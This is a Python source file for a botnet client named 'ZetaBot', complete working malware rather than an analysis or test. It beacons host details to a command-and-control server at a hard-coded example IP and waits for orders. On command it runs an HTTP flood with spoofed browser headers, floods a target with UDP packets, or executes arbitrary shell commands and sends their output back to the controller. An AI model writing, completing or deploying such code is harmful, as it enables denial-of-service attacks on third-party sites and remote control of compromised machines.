#!/usr/bin/env python3
import socket
import json
import threading
import time
import subprocess
import sys
import platform
import os
import urllib.request
import urllib.error

class ZetaBot:
    def __init__(self, server_host, server_port=1337):
        self.server_host = server_host
        self.server_port = server_port
        self.bot_id = platform.node() or "unknown"
        self.running = True
        self.sock = None  # Initialize as None
        
    def connect(self):
        """Connect to the mothership"""
        print(f"[DEBUG] Attempting to connect to {self.server_host}:{self.server_port}")
        
        # Test if we can resolve the hostname
        try:
            print(f"[DEBUG] Resolving {self.server_host}...")
            resolved_ip = socket.gethostbyname(self.server_host)
            print(f"[DEBUG] Resolved to: {resolved_ip}")
        except Exception as e:
            print(f"[DEBUG] DNS Resolution failed: {e}")
            input("Press Enter to exit...")
            return
        
        while self.running:
            try:
                print(f"[DEBUG] Creating socket...")
                # Create NEW socket each attempt
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(10)
                
                print(f"[DEBUG] Connecting...")
                self.sock.connect((self.server_host, self.server_port))
                print(f"[+] Connected to Zeta C&C at {self.server_host}:{self.server_port}")
                
                # Send initial beacon
                if self.send_beacon():
                    # Listen for commands
                    self.listen_for_commands()
                else:
                    print("[DEBUG] Failed to send beacon, retrying...")
                    self.sock.close()
                    time.sleep(5)
                    continue
                
            except socket.timeout:
                print(f"[!] Connection timeout - C&C not responding?")
                break
            except ConnectionRefusedError:
                print(f"[!] Connection refused - C&C not running or port closed?")
                break
            except Exception as e:
                print(f"[!] Connection failed: {type(e).__name__}: {e}")
                break
        
        print("[DEBUG] Connection loop ended")
        input("Press Enter to exit...")
    
    def send_beacon(self):
        """Let the server know we're alive"""
        try:
            beacon = {
                'bot_id': self.bot_id,
                'os': platform.system(),
                'status': 'online',
                'hostname': socket.gethostname()
            }
            self.sock.send(json.dumps(beacon).encode('utf-8'))
            print(f"[DEBUG] Beacon sent: {beacon}")
            return True
        except Exception as e:
            print(f"[DEBUG] Failed to send beacon: {e}")
            return False
    
    def listen_for_commands(self):
        """Wait for orders from the boss"""
        print("[DEBUG] Listening for commands...")
        while self.running and self.sock:
            try:
                data = self.sock.recv(4096).decode('utf-8')
                if not data:
                    print("[DEBUG] Connection closed by server")
                    break
                
                print(f"[DEBUG] Received command: {data}")
                command = json.loads(data)
                self.execute_command(command)
                
            except json.JSONDecodeError as e:
                print(f"[DEBUG] Invalid JSON received: {e}")
            except socket.timeout:
                # Timeout is fine, just continue listening
                continue
            except Exception as e:
                print(f"[DEBUG] Error in listen loop: {e}")
                break
        
        if self.sock:
            self.sock.close()
            self.sock = None
    
    def execute_command(self, command):
        """Execute whatever fucked up shit Alpha wants"""
        action = command.get('action')
        print(f"[DEBUG] Executing action: {action}")
        
        try:
            if action == 'http_flood':
                self.http_flood(
                    command.get('url'),
                    command.get('threads', 10),
                    command.get('duration', 60)
                )
            elif action == 'ddos':
                self.ddos_attack(command.get('target'), command.get('duration', 60))
            elif action == 'exec':
                self.exec_system_command(command.get('command'))
            elif action == 'ping':
                self.send_beacon()
            else:
                print(f"[DEBUG] Unknown action: {action}")
        except Exception as e:
            print(f"[DEBUG] Error executing {action}: {e}")
    
    def http_flood(self, url, threads=10, duration=60):
        """Mass refresh a website - HTTP flood attack"""
        print(f"[*] Starting HTTP flood on {url} with {threads} threads for {duration}s")
        
        import urllib.request
        import urllib.error
        import threading
        
        # Add headers to look like a real browser
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
        }
        
        request = urllib.request.Request(url, headers=headers)
        end_time = time.time() + duration
        counter = 0
        errors = 0
        
        def flood_worker():
            nonlocal counter, errors
            while time.time() < end_time:
                try:
                    response = urllib.request.urlopen(request, timeout=5)
                    counter += 1
                    response.close()
                    if counter % 10 == 0:
                        print(f"[*] HTTP Flood: {counter} requests sent")
                except Exception as e:
                    errors += 1
                    if errors % 10 == 0:
                        print(f"[DEBUG] HTTP error: {e}")
        
        # Create threads
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=flood_worker)
            t.daemon = True
            t.start()
            thread_list.append(t)
            print(f"[DEBUG] Started thread {i+1}")
        
        # Wait for duration
        time.sleep(duration)
        
        print(f"[*] HTTP Flood completed! Sent {counter} requests, {errors} errors")
        
        # Report back to C&C
        result = {
            'status': 'completed',
            'requests': counter,
            'errors': errors,
            'action': 'http_flood'
        }
        try:
            if self.sock:
                self.sock.send(json.dumps(result).encode('utf-8'))
        except:
            pass
    
    def ddos_attack(self, target, duration):
        """Simple DDoS flood - because fuck that target!"""
        print(f"[*] Starting DDoS on {target} for {duration} seconds")
        
        end_time = time.time() + duration
        packets_sent = 0
        bytes_sent = 0
        
        try:
            # Clean up the target
            target = target.replace('http://', '').replace('https://', '').split('/')[0]
            
            # Try to resolve IP if domain given
            try:
                target_ip = socket.gethostbyname(target)
                print(f"[*] Resolved {target} to {target_ip}")
            except:
                target_ip = target
                print(f"[*] Using IP: {target_ip}")
            
            # Create sockets
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            print(f"[*] Starting packet flood to {target_ip}...")
            
            while time.time() < end_time:
                try:
                    # UDP flood - send random garbage
                    packet = os.urandom(1024)
                    sent = sock.sendto(packet, (target_ip, 80))
                    packets_sent += 1
                    bytes_sent += sent
                    
                    if packets_sent % 100 == 0:
                        print(f"[*] Sent {packets_sent} packets")
                    
                except Exception as e:
                    pass
                    
        except Exception as e:
            print(f"[!] DDoS fucked up: {e}")
        finally:
            sock.close()
            print(f"[*] DDoS completed! Sent {packets_sent} packets")
    
    def exec_system_command(self, command):
        """Execute system commands on the bot"""
        try:
            print(f"[*] Executing: {command}")
            
            # Platform-specific shell
            if platform.system() == 'Windows':
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            else:
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            stdout, stderr = process.communicate(timeout=30)
            
            result = {
                'status': 'success' if process.returncode == 0 else 'error',
                'stdout': stdout.decode('utf-8', errors='ignore')[:1000],
                'stderr': stderr.decode('utf-8', errors='ignore')[:1000],
                'returncode': process.returncode
            }
            
            # Send result back to server
            if self.sock:
                self.sock.send(json.dumps(result).encode('utf-8'))
            
        except Exception as e:
            error_result = {'status': 'error', 'error': str(e)}
            if self.sock:
                self.sock.send(json.dumps(error_result).encode('utf-8'))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python bot.py <C&C_SERVER_IP>")
        print("Example: python bot.py 37.114.37.146")
        input("Press Enter to exit...")
        sys.exit(1)
    
    print("""
    ╔╗ ╔╗╔═══╗╔════╗
    ║║ ║║║╔══╝║╔╗╔╗║
    ║╚═╝║║╚══╗╚╝║║╚╝
    ║╔═╗║║╔══╝  ║║  
    ║║ ║║║╚══╗  ║║  
    ╚╝ ╚╝╚═══╝  ╚╝  
    ZETA BOT CLIENT - FIXED VERSION 🔧
    """)
    
    print(f"[DEBUG] Starting bot with server: {sys.argv[1]}")
    print(f"[DEBUG] Python version: {sys.version}")
    
    try:
        bot = ZetaBot(sys.argv[1])
        bot.connect()
    except Exception as e:
        print(f"[CRITICAL] Unhandled exception: {e}")
        import traceback
        traceback.print_exc()
        input("Press Enter to exit...")
